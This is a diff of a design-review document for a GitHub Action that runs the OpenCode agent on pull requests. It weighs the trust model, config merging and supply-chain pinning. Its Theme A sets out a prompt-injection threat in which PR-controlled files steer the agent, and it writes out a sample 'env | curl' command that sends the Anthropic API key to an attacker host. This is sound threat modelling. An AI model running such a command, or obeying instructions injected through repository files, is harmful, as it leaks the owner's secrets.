@@ -1,153 +1,174 @@
 # Open Review Questions
 
-> Source: fresh-eyes review of `design-vision.md` by an independent reviewer
-> with no design-phase context. 28 findings; 11 blockers. Grouped here into
-> four themes and reframed as questions to resolve. Numbering preserved from
-> the original review for traceability.
+> Status: **Tier 1-3 quiz resolved** (13 decisions, baked into
+> `design-vision.md`). The remaining questions are the undecided
+> design-level items from the original 28 findings.
 >
-> One finding (#13) was re-tested against the pinned binary (OpenCode 1.18.4)
-> and did **not** reproduce — see the verification note below. The rest stand
-> as written.
+> Numbering from the original review is preserved in parentheses for
+> traceability.
 
-## Verification note
+## Re-evaluation summary
 
-**#13 (claimed nested bash permissions work) — does not reproduce on 1.18.4.**
-Re-tested with a clean config pointed at via `OPENCODE_CONFIG` plus `--pure`:
-`bash: { "git *": "allow", "*": "deny" }` still denies bash entirely. The
-documentation is ahead of the pinned binary; the doc's statement stands.
-Bonus finding from the re-test: `OPENCODE_CONFIG` did **not** isolate the
-session from the global config (global MCP tools were still present),
-which partially confirms #7's config-precedence concern.
+Re-evaluated the remaining 12 items (Tier 4 + Tier 5) after the Tier 1-3
+resolutions. Some merged, some reframed, one dropped.
+
+| Original | Disposition | New label |
+|---|---|---|
+| A1 (#17), A2 (#15) | **Merged** — same question from two angles | A1 |
+| B1 (#7), B2 (#8), B3 (#9) | **Merged** — coupled config-builder decisions | B1 |
+| B4 (#18) | Kept as-is | B2 |
+| C1 (#11) | **Reframed** by D4 — the action's privileged instructions belong in an agent definition, not a positional prompt | C1 |
+| D1 (#2) | **Reframed** — destination options reduced by D4's "model decides" | D1 |
+| D9 (#22) | Kept as-is | D2 |
+| D10 (#23) | Kept as-is | D3 |
+| D13 (#27) | **Refined** — workflow installs + action asserts is the contract; the question is how to pin both | D4 |
+| D12 (#26) | **Dropped** from questions — implementation work, not a design decision; tracked under Implementation | (tracker) |
+
+8 open design questions remain.
 
 ---
 
 ## Theme A — Security / trust model
 
-These are the load-bearing questions. The design currently hands the model
-untrusted PR code plus a shell plus provider API keys in the environment.
+### A1 (merges #17 + #15) — Trust model for agent execution
 
-- **A1 (#17)** — A pull request controls repository content: `opencode.json`,
-  skills, `AGENTS.md`, `.claude/` instructions, and local MCP server
-  definitions. When the review runs, that content is loaded with provider
-  API keys in scope.
-  **Question:** What is the trust model for PR-controlled config and content?
-  Options: (a) accept as high-trust, `pull_request` event only, document the
-  risk; (b) restrict config provenance to the base branch; (c) disable
-  PR-controlled plugins/MCPs/instructions by default and require opt-in.
+The action runs an agent with `bash: allow`, provider API keys in env, and
+untrusted PR code on disk. A model that runs `env | curl https://attacker/?
+d=$ANTHROPIC_API_KEY` exfiltrates secrets. The current doc states this is
+"an accepted risk of running an agent on untrusted code." Is that the
+right framing?
 
-- **A2 (#15)** — `bash: allow` plus provider keys in env vars is a prompt
-  injection exfiltration path: instructions hidden in PR code could make the
-  model `curl` the keys out. "GitHub token scope is the safety boundary" is
-  wrong — the token is not the only secret in the environment.
-  **Question:** Do we (a) document this as an accepted risk of running an
-  agent on untrusted code, (b) drop env-var keys for an isolated secret
-  mechanism, or (c) add output/network constraints?
+- (a) Accept the risk; document it as the design contract (current doc)
+- (b) Constrain agent inputs: limit MCPs/plugins/skills to base-branch
+  provenance, disable local MCP commands, restrict to trusted config sources
+- (c) Network-output filter: reject outbound network calls from the agent
+- (d) Isolated secret mechanism: fetch secrets per-call instead of env vars
 
-- **A3 (#14)** — Our `permission` block only gates bash. OpenCode defaults
-  permit `edit` — the model can modify files in the checked-out repo.
-  **Question:** Should the generated config default to `edit: deny` (and
-  explicit allow/deny for every relevant tool), making reviews read-only
-  by construction?
+(b), (c), (d) add complexity and bound the agent's capability. (a) is the
+honest "we run an agent on untrusted code" stance. The user value tradeoff:
+how much friction do we add to keep the trust model simple?
 
-- **A4 (#16)** — `GITHUB_TOKEN` default permissions are repo/org-configurable,
-  and comment posting requires `pull-requests: write` explicitly.
-  **Question:** Do we require an explicit minimal `permissions:` block in
-  every sample workflow and fail fast when the token can't post?
+## Theme B — `opencode.json` builder
 
-- **A5 (#24)** — Debug artifacts preserve raw model/tool streams, which can
-  contain source code, credentials printed by tools, and provider responses.
-  **Question:** What redaction, retention, and naming policy applies to
-  debug artifacts? Is debug upload opt-in only?
+### B1 (merges #7 + #8 + #9) — Config builder architecture
 
-## Theme B — `opencode.json` builder correctness
+Three coupled decisions:
 
-The builder's guarantee ("required settings always win") depends on details
-that are currently unverified or undefined.
+1. **Precedence / isolation** — the merged config goes to `$RUNNER_TEMP`
+   and is pointed at via `OPENCODE_CONFIG`. The local re-test (in this
+   branch) suggested global config still loads alongside `OPENCODE_CONFIG`.
+   If global config survives, the builder's "required settings always win"
+   guarantee fails for any setting the global config happens to provide.
+   Empirical verification on 1.18.4 is needed.
 
-- **B1 (#7)** — Config precedence: if repo-root `opencode.json` loads after
-  `OPENCODE_CONFIG`, the user's project config can override the action's
-  required settings. The re-test suggests global config still loads even with
-  `OPENCODE_CONFIG` set.
-  **Question:** What is the actual load order for global / project /
-  `OPENCODE_CONFIG` configs on the pinned version, and does the builder's
-  guarantee survive it? If not, what isolation strategy replaces it?
+2. **Path rebasing** — writing the merged config to `$RUNNER_TEMP` changes
+   the meaning of relative paths in the user's source config (`{file:...}`,
+   plugin paths, MCP `cwd`). Either rebase all relative paths to the source
+   config directory, or write the merged config next to the source.
 
-- **B2 (#8)** — Writing the merged config to `$RUNNER_TEMP` changes the
-  meaning of relative paths in the user's config (`{file:...}` references,
-  plugin paths, MCP `cwd`).
-  **Question:** Do we rebase relative paths to the original config
-  directory, or write the merged config next to the source?
+3. **Merge algorithm** — undefined for nested objects, arrays (`plugin`),
+   `null`, `$schema`, and provider collisions. A deterministic deep-merge
+   rule with examples for each conflicting field type is needed.
 
-- **B3 (#9)** — "Merge" is undefined for nested objects, arrays (`plugin`),
-  `null`, `$schema`, and provider collisions.
-  **Question:** What is the deterministic deep-merge algorithm, with
-  examples for each conflicting field type?
+### B2 (#18) — Built-in provider registry
 
-- **B4 (#18)** — Auto-generating provider entries from `provider/model` is
-  not implementable for arbitrary custom providers (they need package,
-  baseURL, model map, secret variable).
-  **Question:** What is the supported built-in provider registry, and do
-  custom providers have to be fully declared in trusted user config?
+The action can't auto-generate provider entries for arbitrary custom
+providers (they need package, baseURL, model map, secret variable). What
+is the supported built-in registry? Likely: Anthropic, OpenAI, Google
+Gemini, AWS Bedrock, Google Vertex, MiniMax, Kimi/Moonshot, plus GitHub
+Copilot via OpenCode. Custom providers must be fully declared in trusted
+user config.
 
-## Theme C — The "system prompt" isn't one
+## Theme C — Privileged instructions
 
-- **C1 (#11)** — The composed prompt is passed as the positional argument to
-  `opencode run`, which makes it a user message. Repository instructions
-  (`AGENTS.md`, `.claude/`) can compete with or override it.
-  **Question:** Do we define an action-owned OpenCode **agent** (with the
-  instructions in the agent definition, a privileged position) instead of
-  prepending to the prompt? What does that config surface look like?
+### C1 (#11) — Where do the action's privileged instructions live?
 
-- **C2 (#12)** — `AI_REVIEW_SYSTEM_PROMPT` is described as inspectable
-  "before invoking the action," but the action creates it during its own
-  execution.
-  **Question:** Fix the claim — expose the resolved prompt as a workflow
-  artifact, an action output, or drop the inspection promise?
+The D4 pivot made the system prompt the sole source of context. The
+prompt is currently passed as a positional arg to `opencode run`, which
+makes it a user message competing with repo `AGENTS.md` and `.claude/`
+instructions. An action-owned OpenCode **agent definition** (in the merged
+`opencode.json`'s `agent` field) puts the privileged instructions in a
+position that repo instructions can't override.
 
-## Theme D — Interface and documentation holes
+The action's interface would gain an `agent` field (or a hidden
+`.ai-review` agent definition in the merged config) and the prompt becomes
+the *task* the agent gets. The agent definition carries the action's
+standing instructions: output format, severity legend, behavior defaults,
+explicit event-context rendering.
 
-Mechanical, batch-fixable once A–C are settled.
+Is this the right path? The alternative is to accept the user-message
+position and trust that the model's context window privileges the prompt
+over repo instructions (mostly true, but not load-bearing).
 
-- **D1 (#2)** — A push to the default branch has no PR to comment on. Where
-  does a `full`-target review go — commit status, check run, issue, outputs
-  only, or reject the event?
-- **D2 (#3)** — Examples 9.1–9.3 and 9.5 omit checkout and OpenCode install;
-  they don't run as shown. Make every example runnable end-to-end.
-- **D3 (#4)** — `opencode-version` is an action input but the action doesn't
-  install OpenCode. Pick one: action-owned install, or workflow-owned install
-  plus a version assertion.
-- **D4 (#5)** — Target resolution is undefined for `workflow_dispatch`,
-  schedules, non-default-branch pushes, merge queues. Provide an
-  event/target table and fail fast on unsupported combinations.
-- **D5 (#6)** — The diff command requires `fetch-depth: 0` and an existing
-  `origin/$BASE_REF`. Specify the checkout requirement and the exact
-  base/head ref computation rather than letting the model guess.
-- **D6 (#1)** — `comment-url` is listed under `run-reviews` outputs but
-  posting happens in `post-comment`; the composite action's public interface
-  (github-token, post-comment, max-comment-chars) needs one definition.
-- **D7 (#20)** — Comma-separated `prompts` can't represent inline text
-  containing commas. Use a JSON list or explicit `file:`/`text:` syntax.
-- **D8 (#21)** — "Last model/prompt" depends on execution order; define
-  deterministic result selection, null-cost policy, and aggregation fields.
-- **D9 (#22)** — Fusion has no prompt contract: labeling, size limits,
-  injection protection, tool access, cost accounting all unspecified.
-- **D10 (#23)** — No failure-state matrix: timeouts, partial success,
-  invalid config, fusion failure — exit codes, outputs, posting, cleanup.
-- **D11 (#25)** — Supported runner platforms and required binaries unstated
-  (curl|bash install, npx, Node 22+, git, Unix paths).
-- **D12 (#26)** — Every "verified in 1.18.4" claim is the action's brittle
-  ABI. Each needs a pinned contract test that fails clearly on incompatible
-  CLI output.
-- **D13 (#27)** — `@v1` action refs and `curl | bash --version` are not
-  integrity pinning. Specify immutable release refs and checksum provenance.
-- **D14 (#28)** — Section order buries prerequisites after internals; the
-  doc lacks testing, release/versioning, and compatibility sections.
+## Theme D — Interface / runtime
+
+### D1 (#2) — Default-branch push destination
+
+When the action runs on a `push` to the default branch (or a
+`workflow_dispatch`), there is no PR to post a comment to. The
+design-vision.md Future Work section lists the options. Pick one:
+
+- (a) Commit status (green/red on the commit)
+- (b) Check run (named check with details)
+- (c) Open issue (with the review as the body)
+- (d) Outputs only (no posting — let downstream workflows consume)
+- (e) Skip silently (no-op with success exit)
+
+### D2 (#22) — Fusion prompt contract
+
+The synthesis pass needs a prompt template. Unspecified:
+
+- How individual reviews are labeled (model name, prompt name, both)
+- Size limits (concatenated reviews can't be unbounded)
+- Injection protection (does the model see the raw prior reviews, or a
+  sanitized version?)
+- Tool access (fusion is read-only by construction, or no tools at all?)
+- Cost accounting (is fusion included in `cost`/`tokens` outputs?)
+
+### D3 (#23) — Failure matrix
+
+Enumerate failure classes and the action's behavior for each:
+
+- Per-call timeout: how is the partial output handled?
+- All reviews fail: exit code, outputs, posting
+- Fusion fails: post individual results anyway? Outputs?
+- Invalid config: action behavior pre-model-call
+- Permission assertion fails (user config overrides `permission`): fail fast?
+- Checkout assertion fails: fail fast with diagnostic?
+- OpenCode version assertion fails: fail fast?
+- Debug redaction misses a pattern: skip upload entirely, or upload
+  unredacted with a warning?
+
+### D4 (#27) — Supply-chain pinning
+
+The action pins nothing by itself — the workflow installs OpenCode, the
+action asserts the version. The pinning story needs:
+
+- **Immutable action release references** — `@v1` is mutable; `@<sha>` is
+  not. Sample workflows should use either immutable refs or document the
+  mutable ref as a known trade-off.
+- **OpenCode installer integrity** — the `curl | bash` script is not
+  checksum-pinned. Need a verification step (checksum, signature, or
+  pre-built binary download).
+- **MCP package versions** — user configs reference `npx -y <pkg>@latest`
+  which floats. Document the shape or provide a verification helper.
+
+## Implementation tracker (not design questions)
+
+These came out of the review but are implementation work, not design
+decisions. Tracked here for implementation planning.
+
+- **D12 (#26)** — Contract tests for verified claims. Each "verified in
+  1.18.4" statement in `design-vision.md` is the action's brittle ABI. A
+  pinned test fixture (CLI invocation → expected JSONL shape) per claim
+  catches version drift.
 
 ---
 
 ## Proposed order of attack
 
-1. **Theme A** (design discussion — trust model for untrusted PR code)
-2. **Themes B + C** (3–4 focused decisions: config precedence, merge
-   algorithm, agent-vs-prompt, provider registry)
-3. **Theme D** (batch doc fix once A–C are settled)
+1. **A1** — trust model (load-bearing; gates everything)
+2. **C1** — privileged instructions (depends on whether A1 is (a) or richer)
+3. **B1** — config builder (coupled decisions; needs empirical check)
+4. **B2** — provider registry (bounded scope)
+5. **D1, D2, D3, D4** — mechanical once A–C settled
